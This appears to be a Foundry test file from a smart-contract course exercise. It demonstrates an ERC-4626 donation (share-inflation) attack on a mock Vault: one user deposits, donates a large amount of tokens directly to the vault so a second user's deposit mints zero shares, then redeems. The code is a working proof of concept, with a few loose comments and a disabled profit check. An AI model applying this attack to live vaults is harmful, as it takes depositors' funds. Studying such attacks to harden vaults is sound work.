// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../../src/week2/Vault.sol";
import {MockDai} from "../../src/week2/MockDai.sol";

contract ERC4626Attack is Test {

    Vault private vault;
    MockDai private mockDai;

    address public admin = makeAddr("Admin");
    address public bob = makeAddr("Bob");
    address public alice = makeAddr("Alice");

    function setUp() public {
        mockDai = new MockDai("MockDai", "MDAI");
        vault = new Vault(mockDai, "Vault", "VLT");
        // Fund Alice and Bob with 10000 DAI
        mockDai.transfer(alice, 10_000_000 ether);
        mockDai.transfer(bob, 10_000_000 ether);
        // Approvals by bob and alice on Vault contract
        vm.prank(alice);
        mockDai.approve(address(vault), 10_000_000 ether);
        vm.prank(bob);
        mockDai.approve(address(vault), 10_000_000 ether);
    }

    function testAttack() public {
        // 1. Bob deposits X DAI amount and get issued Y shares of Vault tokens
        // 2. Alice tries depositing some Z DAI amount and get issued some shares of Vault tokens
        // 3. Before Alice could deposit, Bob donates A DAI to the Vault to reduce the share price resulting in Alice getting 0 shares
        vm.startPrank(bob);
        vault.deposit(1000 ether, bob); // Deposit of $1000 DAI by Bob
        mockDai.transfer(address(vault), 1000_000 ether);
        vm.stopPrank();
        vm.prank(alice);
        vault.deposit(100 ether, alice); // Alice was supposed to get 100 shares but will now receive 100*1000/1000_000
        uint256 noOfSharesReceivedInitially = vault.balanceOf(bob); // CORRECT THIS
        vm.prank(bob);
        vault.redeem(noOfSharesReceivedInitially, bob, bob); // Bob redeems all his shares
        assertEq(vault.balanceOf(alice), 0); // Alice gets 0 shares
        // assertGt(mockDai.balanceOf(bob), 1001_000 ether); // Bob gets more than his initial assets deposited
    }
}